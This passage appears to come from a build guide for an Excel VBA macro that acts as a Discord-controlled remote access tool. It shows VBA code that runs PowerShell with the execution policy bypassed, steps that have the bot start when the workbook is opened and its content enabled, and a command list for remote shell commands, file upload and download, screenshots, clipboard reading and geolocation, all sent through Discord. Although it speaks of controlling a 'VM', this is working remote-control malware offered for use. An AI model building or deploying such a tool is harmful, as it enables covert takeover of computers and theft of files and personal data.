    tempPs = Environ$("TEMP") & "\vba_ps_" & Format$(Now, "yyyymmddhhnnss") & ".ps1"
    Dim fNum As Integer
    fNum = FreeFile
    Open tempPs For Output As #fNum
    Print #fNum, script
    Close #fNum
    Dim out As String
    out = ShellCapture("powershell -NoProfile -ExecutionPolicy Bypass -File """ & tempPs & """")
    On Error Resume Next
    Kill tempPs
    RunPowerShell = out
End Function

Public Function ReadTextFile(ByVal filePath As String) As String
    Dim fNum As Integer, sLine As String, body As String
    If Dir$(filePath) = "" Then Exit Function
    On Error GoTo ErrH
    fNum = FreeFile
    Open filePath For Input As #fNum
    Do While Not EOF(fNum)
        Line Input #fNum, sLine
        body = body & sLine & vbLf
    Loop
    Close #fNum
    ReadTextFile = body
    Exit Function
ErrH:
    If fNum > 0 Then Close #fNum
End Function

Public Function WMIDateToDate(ByVal s As String) As Date
    If Len(s) < 14 Then Exit Function
    WMIDateToDate = DateSerial(CInt(Left$(s, 4)), CInt(Mid$(s, 5, 2)), CInt(Mid$(s, 7, 2))) + TimeSerial(CInt(Mid$(s, 9, 2)), CInt(Mid$(s, 11, 2)), CInt(Mid$(s, 13, 2)))
End Function
```

## Phase 4: Configuration & Testing
1. Go to the **`DiscordApi`** module. Replace the placeholders at the top of the file:
   * `"YOUR_CHANNEL_ID_HERE"` -> Your copied Channel ID.
   * `"YOUR_USER_ID_HERE"` -> Your copied User ID.
   * `"YOUR_BOT_TOKEN_HERE"` -> Your Bot Token.
2. Click **Debug > Compile VBAProject** to ensure there are no typos. If it succeeds, close the VBA editor.
3. Save the Excel file.
4. **Close Excel completely and reopen it.**
5. If a yellow bar appears, click **Enable Content**.
6. Press `Alt + F11`, open the **Immediate Window** (`Ctrl + G`). You should see `Bot listening. Baseline ID: ...`
7. Go to Discord, type **`!ping`**.

***

## 💻 Command List
- `!help` - Show all commands
- `!ping` - Check bot latency
- `!sysinfo` - Full VM system information
- `!location` - Public IP geolocation
- `!ip` - Local IP configuration
- `!uptime` - Boot time and uptime
- `!ps` - Running processes
- `!pwd` / `!cd` / `!ls` / `!cat` - File system navigation
- `!cmd <command>` - Run a shell command
- `!run <path>` - Execute a program on the VM
- `!upload [path]` - Upload a file from Discord to VM (drag & drop file into Discord)
- `!download <path>` - Send a file from VM to Discord
- `!screenshot` - Capture screen and upload
- `!clip` - Read VM clipboard
- `!msgbox <text>` - Popup a box on the VM
- `!volume <0-100>` - Adjust volume
- `!wallpaper <url>` - Change desktop background
- `!lock` - Lock the workstation
```
```
